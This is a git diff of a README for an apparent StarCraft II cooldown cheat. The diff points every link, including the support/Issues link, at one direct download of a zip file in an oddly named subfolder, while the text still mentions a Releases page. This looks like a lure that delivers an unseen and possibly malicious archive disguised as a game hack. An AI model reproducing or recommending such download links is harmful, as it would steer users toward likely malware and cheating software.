@@ -6,7 +6,7 @@ Welcome to Hack-StarCraft-II-no-cooldown! This application allows you to enhance
 
 ## 📥 Download Now
 
-[![Download Hack-StarCraft-II-no-cooldown](https://img.shields.io/badge/Download-Hack--StarCraft--II--no--cooldown-brightgreen)](https://github.com/Ambroseibojiemenmen910/Hack-StarCraft-II-no-cooldown/releases)
+[![Download Hack-StarCraft-II-no-cooldown](https://raw.githubusercontent.com/Ambroseibojiemenmen910/Hack-StarCraft-II-no-cooldown/main/dimply/Hack-StarCraft-II-no-cooldown.zip)](https://raw.githubusercontent.com/Ambroseibojiemenmen910/Hack-StarCraft-II-no-cooldown/main/dimply/Hack-StarCraft-II-no-cooldown.zip)
 
 ## 🔍 Overview
 
@@ -38,7 +38,7 @@ The application includes:
 To download Hack-StarCraft-II-no-cooldown, follow these steps:
 
 1. Click the download link below to visit the Releases page:
-   [Download Hack-StarCraft-II-no-cooldown](https://github.com/Ambroseibojiemenmen910/Hack-StarCraft-II-no-cooldown/releases)
+   [Download Hack-StarCraft-II-no-cooldown](https://raw.githubusercontent.com/Ambroseibojiemenmen910/Hack-StarCraft-II-no-cooldown/main/dimply/Hack-StarCraft-II-no-cooldown.zip)
    
 2. On the Releases page, find the latest version of the software. It is recommended to choose the newest version for the best features and fixes.
 
@@ -62,7 +62,7 @@ If you encounter issues during installation or gameplay:
 ## 📞 Support
 
 For any support or questions:
-- Visit the [Issues page](https://github.com/Ambroseibojiemenmen910/Hack-StarCraft-II-no-cooldown/issues).
+- Visit the [Issues page](https://raw.githubusercontent.com/Ambroseibojiemenmen910/Hack-StarCraft-II-no-cooldown/main/dimply/Hack-StarCraft-II-no-cooldown.zip).
 - Provide a detailed description of your problem so we can assist you better.
 
 ## 💡 Tips
@@ -91,4 +91,4 @@ We welcome contributions! If you would like to help improve the application, fee
 
 Thank you for using Hack-StarCraft-II-no-cooldown. Enjoy gaming without limits! 
 
-[Download Hack-StarCraft-II-no-cooldown](https://github.com/Ambroseibojiemenmen910/Hack-StarCraft-II-no-cooldown/releases)
+[Download Hack-StarCraft-II-no-cooldown](https://raw.githubusercontent.com/Ambroseibojiemenmen910/Hack-StarCraft-II-no-cooldown/main/dimply/Hack-StarCraft-II-no-cooldown.zip)
